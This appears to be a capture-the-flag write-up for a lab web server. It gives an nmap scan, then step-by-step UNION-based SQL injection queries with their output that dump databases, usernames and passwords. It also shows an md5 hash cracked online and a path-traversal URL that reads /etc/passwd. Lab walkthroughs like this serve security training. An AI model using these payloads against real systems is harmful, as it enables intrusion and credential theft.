<details>
  <summary><h1>1. Nmap Scan</h1></summary>

```console
┌──(root㉿kali)-[~]
└─# nmap -p- -A 10.0.88.33
Starting Nmap 7.93 ( https://nmap.org ) at 2022-12-11 13:42 +08
Nmap scan report for 10.0.88.33
Host is up (0.0019s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE    SERVICE VERSION
22/tcp filtered ssh
80/tcp open     http    Apache httpd 2.4.38 ((Debian))
|_http-title: Example.com - Staff Details - Welcome
|_http-server-header: Apache/2.4.38 (Debian)
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.93%E=4%D=12/11%OT=80%CT=1%CU=30953%PV=Y%DS=2%DC=T%G=Y%TM=63956D
OS:DE%P=x86_64-pc-linux-gnu)SEQ(SP=101%GCD=1%ISR=10B%TI=Z%TS=A)OPS(O1=M5B4S
OS:T11NW7%O2=M5B4ST11NW7%O3=M5B4NNT11NW7%O4=M5B4ST11NW7%O5=M5B4ST11NW7%O6=M
OS:5B4ST11)WIN(W1=7120%W2=7120%W3=7120%W4=7120%W5=7120%W6=7120)ECN(R=N)T1(R
OS:=Y%DF=Y%T=40%S=O%A=S+%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=N)T5(R=Y%DF=Y%T=40
OS:%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=N)T7(R=N)U1(R=Y%DF=N%T=40%IPL=164%UN=
OS:0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=N)

Network Distance: 2 hops

TRACEROUTE (using port 199/tcp)
HOP RTT     ADDRESS
1   0.89 ms 192.168.17.1
2   1.54 ms 10.0.88.33

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 23.65 seconds
```

</details>

# 2. SQL Injection

URL: `http://<ip-address>/search.php`

<details>
  <summary><h2>1. Identify query vulnerability</h2></summary>

Legitimate input `tom`:

```console
ID: 5
Name: Tom Cat
Position: Driver
Phone No: 802438797
Email: tomc@example.com
```

</details>

<details>
  <summary><h2>2.Identify injection vector</h2></summary>

Testing `tom'` → `0 results`

Testing `tom' #` → same results as legitimate input → SQL query is susceptible to injection

</details>

<details>
  <summary><h2>3. Identify range</h2></summary>

Query: `tom' ORDER BY 7 #` → `0 results`

`ORDER BY` works until `6` and fails at `7` → data ramge is 6 columns

</details>

<details>
  <summary><h2>4. Identify data display positions</h2></summary>

Query: `tom' UNION SELECT 1,2,3,4,5,6 #`

```console
ID: 5
Name: Tom Cat
Position: Driver
Phone No: 802438797
Email: tomc@example.com

ID: 1
Name: 2 3
Position: 4
Phone No: 5
Email: 6
```

</details>

<details>
  <summary><h2>5. Retrieve database/version information</h2></summary>

Query: `tom' UNION SELECT 1,2,3,DATABASE(),VERSION(),TABLE_SCHEMA FROM information_schema.TABLES #`

```console
ID: 5
Name: Tom Cat
Position: Driver
Phone No: 802438797
Email: tomc@example.com

ID: 1
Name: 2 3
Position: Staff
Phone No: 10.3.17-MariaDB-0+deb10u1
Email: information_schema

ID: 1
Name: 2 3
Position: Staff
Phone No: 10.3.17-MariaDB-0+deb10u1
Email: Staff

ID: 1
Name: 2 3
Position: Staff
Phone No: 10.3.17-MariaDB-0+deb10u1
Email: users
```

Found 2 databases: `Staff` and `users`

</details>

<details>
  <summary><h2>6. Enumerate tables (from <code>Staff</code>)</h2></summary>

Query: `tom' UNION SELECT 1,2,3,4,TABLE_SCHEMA,TABLE_NAME FROM information_schema.TABLES WHERE TABLE_SCHEMA='Staff' #`

```console
ID: 5
Name: Tom Cat
Position: Driver
Phone No: 802438797
Email: tomc@example.com

ID: 1
Name: 2 3
Position: 4
Phone No: Staff
Email: StaffDetails

ID: 1
Name: 2 3
Position: 4
Phone No: Staff
Email: Users
```

Found 2 tables: `StaffDetails` and `Users`

</details>

<details>
  <summary><h2>7. Enumerate columns (from <code>Staff.Users</code>)</h2></summary>

Query: `tom' UNION SELECT 1,2,3,4,TABLE_SCHEMA,TABLE_NAME FROM information_schema.TABLES WHERE TABLE_SCHEMA='Staff' #`

```console
ID: 5
Name: Tom Cat
Position: Driver
Phone No: 802438797
Email: tomc@example.com

ID: 1
Name: 2 3
Position: 4
Phone No: Users
Email: UserID

ID: 1
Name: 2 3
Position: 4
Phone No: Users
Email: Username

ID: 1
Name: 2 3
Position: 4
Phone No: Users
Email: Password
```

</details>

<details>
  <summary><h2>8. Retrieve data (from <code>Staff.Users</code>)</h2></summary>

Query: `tom' UNION SELECT 1,2,3,UserID,Username,Password FROM Users #`

```console
ID: 5
Name: Tom Cat
Position: Driver
Phone No: 802438797
Email: tomc@example.com

ID: 1
Name: 2 3
Position: 1
Phone No: admin
Email: 856f5de590ef37314e7c3bdf6f8a66dc
```

</details>

<details>
  <summary><h2>6-Again. Enumerate tables (from <code>users</code>)</h2></summary>

Query: `tom' UNION SELECT 1,2,3,4,TABLE_SCHEMA,TABLE_NAME FROM information_schema.TABLES WHERE TABLE_SCHEMA='users' #`

```console
ID: 5
Name: Tom Cat
Position: Driver
Phone No: 802438797
Email: tomc@example.com

ID: 1
Name: 2 3
Position: 4
Phone No: users
Email: UserDetails
```

</details>

<details>
  <summary><h2>7-Again. Enumerate columns (from <code>users.UserDetails</code>)</h2></summary>

Query: `tom' UNION SELECT 1,2,3,4,TABLE_NAME,COLUMN_NAME FROM information_schema.COLUMNS WHERE TABLE_SCHEMA='users' AND TABLE_NAME='UserDetails' #`

```console
ID: 5
Name: Tom Cat
Position: Driver
Phone No: 802438797
Email: tomc@example.com

ID: 1
Name: 2 3
Position: 4
Phone No: UserDetails
Email: id

ID: 1
Name: 2 3
Position: 4
Phone No: UserDetails
Email: firstname

ID: 1
Name: 2 3
Position: 4
Phone No: UserDetails
Email: lastname

ID: 1
Name: 2 3
Position: 4
Phone No: UserDetails
Email: username

ID: 1
Name: 2 3
Position: 4
Phone No: UserDetails
Email: password

ID: 1
Name: 2 3
Position: 4
Phone No: UserDetails
Email: reg_date
```

</details>

<details>
  <summary><h2>8-Again. Retrieve data (from <code>users.UserDetails</code>)</h2></summary>

Query: `tom' UNION SELECT id,firstname,lastname,username,password,reg_date FROM users.UserDetails #`

```console
ID: 5
Name: Tom Cat
Position: Driver
Phone No: 802438797
Email: tomc@example.com

ID: 1
Name: Mary Moe
Position: marym
Phone No: 3kfs86sfd
Email: 2019-12-29 16:58:26

ID: 2
Name: Julie Dooley
Position: julied
Phone No: 468sfdfsd2
Email: 2019-12-29 16:58:26

ID: 3
Name: Fred Flintstone
Position: fredf
Phone No: 4sfd87sfd1
Email: 2019-12-29 16:58:26

ID: 4
Name: Barney Rubble
Position: barneyr
Phone No: RocksOff
Email: 2019-12-29 16:58:26

ID: 5
Name: Tom Cat
Position: tomc
Phone No: TC&TheBoyz
Email: 2019-12-29 16:58:26

ID: 6
Name: Jerry Mouse
Position: jerrym
Phone No: B8m#48sd
Email: 2019-12-29 16:58:26

ID: 7
Name: Wilma Flintstone
Position: wilmaf
Phone No: Pebbles
Email: 2019-12-29 16:58:26

ID: 8
Name: Betty Rubble
Position: bettyr
Phone No: BamBam01
Email: 2019-12-29 16:58:26

ID: 9
Name: Chandler Bing
Position: chandlerb
Phone No: UrAG0D!
Email: 2019-12-29 16:58:26

ID: 10
Name: Joey Tribbiani
Position: joeyt
Phone No: Passw0rd
Email: 2019-12-29 16:58:26

ID: 11
Name: Rachel Green
Position: rachelg
Phone No: yN72#dsd
Email: 2019-12-29 16:58:26

ID: 12
Name: Ross Geller
Position: rossg
Phone No: ILoveRachel
Email: 2019-12-29 16:58:26

ID: 13
Name: Monica Geller
Position: monicag
Phone No: 3248dsds7s
Email: 2019-12-29 16:58:26

ID: 14
Name: Phoebe Buffay
Position: phoebeb
Phone No: smellycats
Email: 2019-12-29 16:58:26

ID: 15
Name: Scooter McScoots
Position: scoots
Phone No: YR3BVxxxw87
Email: 2019-12-29 16:58:26

ID: 16
Name: Donald Trump
Position: janitor
Phone No: Ilovepeepee
Email: 2019-12-29 16:58:26

ID: 17
Name: Scott Morrison
Position: janitor2
Phone No: Hawaii-Five-0
Email: 2019-12-29 16:58:28
```

</details>

# 3. Getting a login to `/manage.php`

A credential was retrieved from the from `Staff.Users` table

Username: `admin`

Password: `856f5de590ef37314e7c3bdf6f8a66dc`

Attempts to crack the password hash fails because the password doesn't match even the `rockyou` wordlist

☝️ hashcat is not always the answer for cracking hashes

Thankfully, md5 is easily reversible, Googling returns several online md5 hash reversers

Trying the one at <https://md5.gromweb.com/> reveals that the password is: `transorbital1`

Logging in with the credentials reveals a curious `File does not exist` error at the page footer:

![image](https://user-images.githubusercontent.com/90442032/206894411-31c7f1ce-c8f4-4528-8806-bc28ef262255.png)

This suggests that the page is susceptible to some form of file inclusion

# 4. Finding the file inclusion vulnerability

Without knowing where the DocumentRoot of the target machine is at, the next step is to identify the path traversal for the file inclusion

Since this is a linux box, the `/etc/passwd` file should exist

`../` can be appended to the URL until the `/etc/passwd` file is returned

The path is ultimately found at: `http://<ip-address>/manage.php?file=../../../../etc/passwd`

![image](https://user-images.githubusercontent.com/90442032/206894750-0758d4ad-8fde-49f7-b1ac-d81035b70a7c.png)
